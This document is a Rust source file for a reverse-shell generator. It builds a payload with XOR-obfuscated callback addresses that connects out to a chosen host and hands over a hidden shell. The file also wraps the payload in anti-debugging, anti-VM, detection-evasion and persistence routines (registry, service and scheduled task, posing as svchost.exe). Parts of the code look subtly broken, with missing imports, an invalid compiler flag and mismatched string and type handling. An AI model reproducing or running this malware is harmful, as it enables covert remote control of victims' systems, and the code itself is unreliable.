use clap::Parser;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::io::{self, Read, Write};

mod encryption;
mod connection;
mod anti_debug;
mod anti_vm;
mod connection_methods;
mod obfuscation;
mod defense_evasion;
mod network_stealth;
mod persistence;

use encryption::{generate_obfuscated_string, XorKey};
use connection::{Connection, ConnectionConfig};
use anti_debug::AntiDebug;
use anti_vm::AntiVM;
use connection_methods::ConnectionMethod;
use obfuscation::Obfuscation;
use defense_evasion::DefenseEvasion;
use network_stealth::{NetworkStealth, TrafficPattern, Protocol, Encryption as NetworkEncryption, Fragmentation};
use persistence::Persistence;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target IP address
    #[arg(short, long)]
    ip: String,

    /// Target port number
    #[arg(short, long)]
    port: u16,

    /// Target operating system (linux or windows)
    #[arg(short, long, value_enum)]
    os: OsTarget,

    /// Shell path (default: /bin/sh for Linux, cmd.exe for Windows)
    #[arg(short, long)]
    shell: Option<String>,

    /// Enable TLS support
    #[arg(short, long)]
    tls: bool,

    /// Output binary path
    #[arg(short, long)]
    output: PathBuf,

    /// Enable anti-debugging features
    #[arg(short, long)]
    anti_debug: bool,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum OsTarget {
    Linux,
    Windows,
}

fn main() -> anyhow::Result<()> {
    let args = Args::parse();
    let system = System::new_all();
    let anti_debug = AntiDebug::new();
    let anti_vm = AntiVM::new();
    let defense_evasion = DefenseEvasion::new();
    let network_stealth = NetworkStealth::new();
    let persistence = Persistence::new("C:\\Windows\\System32\\svchost.exe".to_string());

    // Check for debugging
    if anti_debug.detect_debugger() {
        println!("Debugger detected!");
        return Ok(());
    }

    // Check for VM
    if anti_vm.detect_vm() {
        println!("VM detected!");
        return Ok(());
    }

    // Evade detection
    if !defense_evasion.evade_signature_detection() {
        println!("Failed to evade signature detection!");
        return Ok(());
    }

    if !defense_evasion.evade_behavior_detection() {
        println!("Failed to evade behavior detection!");
        return Ok(());
    }

    if !defense_evasion.evade_network_detection() {
        println!("Failed to evade network detection!");
        return Ok(());
    }

    if !defense_evasion.evade_process_detection() {
        println!("Failed to evade process detection!");
        return Ok(());
    }

    if !defense_evasion.evade_file_detection() {
        println!("Failed to evade file detection!");
        return Ok(());
    }

    if !defense_evasion.evade_registry_detection() {
        println!("Failed to evade registry detection!");
        return Ok(());
    }
    
    // Set up network stealth
    let traffic_pattern = TrafficPattern {
        packet_size: 1024,
        inter_arrival_time: Duration::from_millis(100),
        protocol: Protocol::Tcp,
        encryption: NetworkEncryption::Aes,
        fragmentation: Fragmentation::Random,
    };
    network_stealth.set_traffic_pattern(traffic_pattern);

    // Simulate normal traffic
    if !network_stealth.simulate_normal_traffic() {
        println!("Failed to simulate normal traffic!");
        return Ok(());
    }

    // Add persistence mechanisms
    if let Err(e) = persistence.add_registry_persistence() {
        println!("Failed to add registry persistence: {}", e);
    }
    if let Err(e) = persistence.add_service_persistence() {
        println!("Failed to add service persistence: {}", e);
    }
    if let Err(e) = persistence.add_scheduled_task() {
        println!("Failed to add scheduled task: {}", e);
    }

    // Generate the reverse shell code
    let shell_code = generate_shell_code(&args)?;
    
    // Create a temporary file for the shell code
    let temp_dir = tempfile::tempdir()?;
    let source_file = temp_dir.path().join("shell.rs");
    std::fs::write(&source_file, shell_code)?;
    
    // Compile the code
    compile_shell(&source_file, &args.output)?;
    
    println!("Shell binary generated at: {}", args.output.display());
    Ok(())
}

fn generate_shell_code(args: &Args) -> anyhow::Result<String> {
    let shell_path = args.shell.clone().unwrap_or_else(|| {
        match args.os {
            OsTarget::Linux => "/bin/sh".to_string(),
            OsTarget::Windows => "cmd.exe".to_string(),
        }
    });

    // Generate XOR key and encrypt sensitive data
    let (encrypted_ip, ip_key) = generate_obfuscated_string(&args.ip);
    let (encrypted_port, port_key) = generate_obfuscated_string(&args.port.to_string());
    let (encrypted_shell, shell_key) = generate_obfuscated_string(&shell_path);

    let mut code = String::new();

    // Add necessary imports
    code.push_str(r#"
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};
use std::thread;
"#);

    if args.tls {
        code.push_str(r#"
use native_tls::TlsConnector;
"#);
    }

    if args.anti_debug {
        code.push_str(r#"
use std::fs;
use std::time::Duration;
"#);
    }

    // Add encryption module
    code.push_str(r#"
mod encryption {
    pub struct XorKey {
        key: u8,
    }

    impl XorKey {
        pub fn new(key: u8) -> Self {
            Self { key }
        }

        pub fn decrypt(&self, data: &[u8]) -> String {
            data.iter()
                .map(|&b| (b ^ self.key) as char)
                .collect()
        }
    }
}
"#);

    // Add connection module
    code.push_str(r#"
mod connection {
    use std::io::{self, Read, Write};
    use std::net::TcpStream;
    use std::time::{Duration, Instant};
    use native_tls::TlsConnector;

    pub struct Connection {
        stream: Option<TcpStream>,
        tls: bool,
        max_retries: u32,
        initial_delay: Duration,
        max_delay: Duration,
        backoff_factor: f64,
    }

    impl Connection {
        pub fn new(tls: bool) -> Self {
            Self {
                stream: None,
                tls,
                max_retries: 5,
                initial_delay: Duration::from_secs(1),
                max_delay: Duration::from_secs(30),
                backoff_factor: 2.0,
            }
        }

        pub fn connect(&mut self, addr: &str) -> io::Result<()> {
            let mut retries = 0;
            let mut delay = self.initial_delay;

            loop {
                match self.try_connect(addr) {
                    Ok(()) => return Ok(()),
                    Err(e) => {
                        if retries >= self.max_retries {
                            return Err(e);
                        }

                        thread::sleep(delay);
                        delay = std::cmp::min(
                            Duration::from_secs_f64(delay.as_secs_f64() * self.backoff_factor),
                            self.max_delay,
                        );
                        retries += 1;
                    }
                }
            }
        }

        fn try_connect(&mut self, addr: &str) -> io::Result<()> {
            let stream = TcpStream::connect(addr)?;
            
            if self.tls {
                let connector = TlsConnector::new()?;
                let stream = connector.connect("", stream)?;
                self.stream = Some(stream);
            } else {
                self.stream = Some(stream);
            }

            Ok(())
        }

        pub fn read(&mut self, buffer: &mut [u8]) -> io::Result<usize> {
            match &mut self.stream {
                Some(stream) => stream.read(buffer),
                None => Err(io::Error::new(
                    io::ErrorKind::NotConnected,
                    "Not connected to remote host",
                )),
            }
        }

        pub fn write(&mut self, buffer: &[u8]) -> io::Result<usize> {
            match &mut self.stream {
                Some(stream) => stream.write(buffer),
                None => Err(io::Error::new(
                    io::ErrorKind::NotConnected,
                    "Not connected to remote host",
                )),
            }
        }

        pub fn flush(&mut self) -> io::Result<()> {
            match &mut self.stream {
                Some(stream) => stream.flush(),
                None => Err(io::Error::new(
                    io::ErrorKind::NotConnected,
                    "Not connected to remote host",
                )),
            }
        }
    }
}
"#);

    // Add anti-debug module if enabled
    if args.anti_debug {
        code.push_str(r#"
mod anti_debug {
    use std::time::{Duration, Instant};
    use std::thread;
    use std::fs;

    pub struct AntiDebug {
        last_check: Instant,
        check_interval: Duration,
    }

    impl AntiDebug {
        pub fn new() -> Self {
            Self {
                last_check: Instant::now(),
                check_interval: Duration::from_secs(1),
            }
        }

        pub fn check(&mut self) -> bool {
            if self.last_check.elapsed() < self.check_interval {
                return true;
            }

            self.last_check = Instant::now();
            !self.is_debugger_present()
        }

        fn is_debugger_present(&self) -> bool {
            #[cfg(target_os = "windows")]
            {
                unsafe {
                    windows::Win32::System::Debugging::IsDebuggerPresent().as_bool()
                }
            }

            #[cfg(target_os = "linux")]
            {
                let debuggers = [
                    "gdb",
                    "lldb",
                    "radare2",
                    "ida",
                    "x64dbg",
                    "ollydbg",
                    "windbg",
                ];

                for debugger in debuggers.iter() {
                    if let Ok(entries) = fs::read_dir("/proc") {
                        for entry in entries {
                            if let Ok(entry) = entry {
                                if let Ok(cmdline) = fs::read_to_string(entry.path().join("cmdline")) {
                                    if cmdline.contains(debugger) {
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                }

                if let Ok(status) = fs::read_to_string("/proc/self/status") {
                    for line in status.lines() {
                        if line.starts_with("TracerPid:") {
                            let pid = line.split_whitespace().nth(1).unwrap_or("0");
                            return pid != "0";
                        }
                    }
                }

                false
            }
        }

        pub fn sleep_detection(&self) -> bool {
            let start = Instant::now();
            thread::sleep(Duration::from_millis(100));
            start.elapsed() > Duration::from_millis(150)
        }
    }
}
"#);
    }

    // Main function
    code.push_str(&format!(r#"
fn main() -> io::Result<()> {{
    // Decrypt sensitive data
    let ip_key = encryption::XorKey::new({});
    let port_key = encryption::XorKey::new({});
    let shell_key = encryption::XorKey::new({});
    
    let ip = ip_key.decrypt(&{:?});
    let port = port_key.decrypt(&{:?});
    let shell = shell_key.decrypt(&{:?});
    
    let addr = format!("{{}}:{{}}", ip, port);
"#, ip_key, port_key, shell_key, encrypted_ip, encrypted_port, encrypted_shell));

    if args.anti_debug {
        code.push_str(r#"
    let mut anti_debug = anti_debug::AntiDebug::new();
"#);
    }

    code.push_str(r#"
    let mut conn = connection::Connection::new(");

    if args.tls {
        code.push_str("true");
    } else {
        code.push_str("false");
    }

    code.push_str(r#");
    conn.connect(&addr)?;

    let mut child = Command::new(&shell)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
"#);

    if matches!(args.os, OsTarget::Windows) {
        code.push_str(r#"
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
"#);
    }

    code.push_str(r#"
        .spawn()?;

    let mut buffer = [0; 1024];
    loop {
"#);

    if args.anti_debug {
        code.push_str(r#"
        if !anti_debug.check() || anti_debug.sleep_detection() {
            break;
        }
"#);
    }

    code.push_str(r#"
        let n = conn.read(&mut buffer)?;
        if n == 0 { break; }
        
        child.stdin.as_mut().unwrap().write_all(&buffer[..n])?;
        child.stdin.as_mut().unwrap().flush()?;
        
        let mut output = String::new();
        child.stdout.as_mut().unwrap().read_to_string(&mut output)?;
        conn.write(output.as_bytes())?;
        conn.flush()?;
    }
    Ok(())
}
"#);

    Ok(code)
}

fn compile_shell(source_file: &std::path::Path, output_file: &std::path::Path) -> anyhow::Result<()> {
    let status = std::process::Command::new("rustc")
        .arg("--release")
        .arg("-o")
        .arg(output_file)
        .arg(source_file)
        .status()?;

    if !status.success() {
        anyhow::bail!("Failed to compile shell code");
    }

    Ok(())
}
